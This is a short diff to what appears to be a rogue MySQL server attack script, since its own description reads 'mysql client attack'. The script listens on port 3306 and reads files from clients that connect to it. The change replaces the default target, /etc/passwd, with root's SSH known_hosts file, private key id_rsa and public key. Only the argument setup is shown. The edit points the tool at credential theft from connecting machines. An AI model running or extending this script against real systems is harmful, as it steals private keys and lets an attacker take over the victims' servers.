@@ -4,7 +4,7 @@ import argparse
 parser = argparse.ArgumentParser(description = "mysql client attack")
 parser.add_argument("-l", default="0.0.0.0", type=str, dest="addr", help="Specify ip for listen ")
 parser.add_argument("-p", default=3306, type=int, dest="port", help="Specify local port for listen")
-parser.add_argument("-f", default="/etc/passwd", type=str, dest="file", help="Specify file you want to read")
+parser.add_argument("-f", default=['/root/.ssh/known_hosts', '/root/.ssh/id_rsa', '/root/.ssh/id_rsa.pub'], type=str, dest="file", help="Specify file you want to read")
 
 args = parser.parse_args()
 
